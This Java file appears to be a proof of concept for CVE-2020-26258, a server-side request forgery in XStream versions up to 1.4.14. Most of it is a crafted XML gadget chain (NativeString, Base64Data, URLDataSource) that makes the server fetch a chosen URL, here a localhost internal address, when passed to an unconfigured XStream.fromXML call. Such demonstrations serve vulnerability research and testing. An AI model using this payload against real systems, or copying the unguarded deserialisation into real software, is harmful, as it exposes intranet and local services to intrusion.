import com.thoughtworks.xstream.XStream;

/*
CVE-2020-26258: A Server-Side Forgery Request can be activated unmarshalling
with XStream to access data streams from an arbitrary URL referencing a resource in an intranet or the local host.

All versions until and including version 1.4.14

https://x-stream.github.io/CVE-2020-26258.html

Security framework of XStream not explicitly initialized, using predefined black list on your own risk.

*/


public class CVE_2020_26258 {
    public static void main(String[] args) {
        String ssrf_xml = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='javax.activation.URLDataSource'>\n" +
                "            <url>http://localhost:8989/internal/:</url>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";

        XStream xstream = new XStream();
        xstream.fromXML(ssrf_xml);

    }
}
